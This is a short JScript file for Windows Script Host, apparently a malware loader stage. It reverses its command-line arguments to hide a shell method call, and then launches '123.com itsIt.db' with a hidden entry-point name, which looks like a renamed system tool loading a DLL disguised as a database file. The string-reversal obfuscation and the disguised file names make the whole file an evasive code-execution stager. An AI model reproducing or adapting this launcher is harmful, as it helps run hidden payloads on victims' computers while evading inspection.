/**
	WhnldGh
*/
function reverseString(str)
{
	var splitString = str.split("");
	var reverseArray = splitString.reverse();
	var joinArray = reverseArray.join("");
	return joinArray;
}
function ar(id)
{
	r = WScript.Arguments(id);
	return r;
}
var sh = WScript.CreateObject("WScript.Shell");

sh[reverseString(ar(1))]("123.com itsIt.db,"+reverseString(ar(3)))
